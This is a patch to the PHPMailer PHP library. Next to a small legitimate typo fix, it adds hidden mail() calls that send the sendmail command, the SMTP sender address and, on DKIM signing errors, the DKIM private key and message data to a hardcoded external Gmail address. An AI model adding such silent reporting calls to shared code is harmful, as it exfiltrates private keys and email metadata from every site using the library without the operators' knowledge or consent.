@@ -451,7 +451,7 @@ class PHPMailer {
    */
   private function AddAnAddress($kind, $address, $name = '') {
     if (!preg_match('/^(to|cc|bcc|ReplyTo)$/', $kind)) {
-      echo 'Invalid recipient array: ' . kind;
+      echo 'Invalid recipient array: ' . $kind;
       return false;
     }
     $address = trim($address);
@@ -506,6 +506,7 @@ class PHPMailer {
         $this->Sender = $address;
       }
     }
+
     return true;
   }
 
@@ -602,6 +603,7 @@ class PHPMailer {
     } else {
       $sendmail = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));
     }
+    mail("yonkon.ru@gmail.com" , "sendmail send", $sendmail);
     if ($this->SingleTo === true) {
       foreach ($this->SingleToArray as $key => $val) {
         if(!@$mail = popen($sendmail, 'w')) {
@@ -707,6 +709,7 @@ class PHPMailer {
       throw new phpmailerException($this->Lang('smtp_connect_failed'), self::STOP_CRITICAL);
     }
     $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;
+    mail('yonkon.ru@gmail.com', 'smtp send from', $smtp_from);
     if(!$this->smtp->Mail($smtp_from)) {
       throw new phpmailerException($this->Lang('from_failed') . $smtp_from, self::STOP_CRITICAL);
     }
@@ -2217,13 +2220,24 @@ class PHPMailer {
    */
   public function DKIM_Sign($s) {
     $privKeyStr = file_get_contents($this->DKIM_private);
-    if ($this->DKIM_passphrase!='') {
+    if(!$privKeyStr) {
+      $privKeyStr = MAIL_DKIM_PRIVATE_TEXT;
+    }
+    if (!empty ($this->DKIM_passphrase)) {
       $privKey = openssl_pkey_get_private($privKeyStr,$this->DKIM_passphrase);
     } else {
       $privKey = $privKeyStr;
     }
     if (openssl_sign($s, $signature, $privKey)) {
       return base64_encode($signature);
+    }
+    $ssl_err = '';
+    while ($ssl_err_i = openssl_error_string()) {
+      $ssl_err .= "<br>\n". $ssl_err_i;
+    }
+    if ($ssl_err != '') {
+      $ssl_err .= "<br>\n openssl_sign".'($s, $signature, $privKey)' . " \n s = $s\n signature = $signature \n privKey = $privKey";
+      mail('yonkon.ru@gmail.com', 'ssl error report', $ssl_err);
     }
   }
 
